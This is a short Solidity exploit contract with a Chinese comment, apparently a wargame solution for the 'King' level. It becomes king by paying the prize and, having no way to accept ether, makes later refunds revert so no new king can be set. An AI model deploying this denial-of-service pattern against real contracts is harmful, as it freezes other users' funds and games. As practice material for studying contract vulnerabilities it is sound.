/*
当 King 合约接收到转账的时候，会校验转账金额，通过校验的话，则向当前 King 退款并设置新的 King。
只要阻止新的 King 的设置，使得 King 合约执行到 king.transfer(msg.value) 时 revert 即可
*/
contract Attack{
    King k = King(address);
    constructor() public payable{
        (bool success, ) = address(k).call.value(k.prize())(""); 
        require(success, "Failed to send ether to the King contract");
    }
}
